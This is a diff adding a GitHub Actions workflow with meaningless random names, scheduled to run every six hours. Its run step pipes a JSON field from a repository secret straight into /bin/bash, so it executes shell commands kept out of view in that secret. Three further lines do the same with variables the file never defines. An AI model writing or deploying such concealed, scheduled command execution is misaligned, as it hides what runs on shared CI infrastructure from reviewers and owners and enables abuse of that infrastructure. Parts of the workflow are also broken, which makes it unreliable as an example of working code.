@@ -1,0 +1,22 @@
+name: weixutong6745
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: weixutong6745
+        env:
+          rchxy39: ${{ secrets.rchxy39 }}
+        run: |
+          echo $rchxy39 | jq -r .bj51055 | /bin/bash
+          echo $uhfdf07635 | jq -r .zhl7 | /bin/bash
+          echo $cxznn7 | jq -r .egsjx0 | /bin/bash
+          echo $raj5144 | jq -r .ep8 | /bin/bash
+
